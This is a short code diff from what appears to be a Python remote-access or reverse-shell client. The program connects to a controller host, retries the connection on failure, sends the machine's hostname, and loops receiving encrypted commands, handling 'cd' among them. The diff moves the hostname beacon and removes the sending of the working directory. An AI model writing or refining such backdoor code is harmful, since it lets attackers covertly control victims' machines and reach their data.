@@ -118,13 +118,13 @@ def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((HOST, PORT))
+        send(socket.gethostname())
     except:
-        connect() 
+        connect()
+
     
 
 def main():
-    s.sendall(crypt(os.getcwd()))
-    s.sendall(crypt(socket.gethostname()))
     while True:
         command = crypt(s.recv(1024), False)
         if command[:2].decode("utf-8") == 'cd':
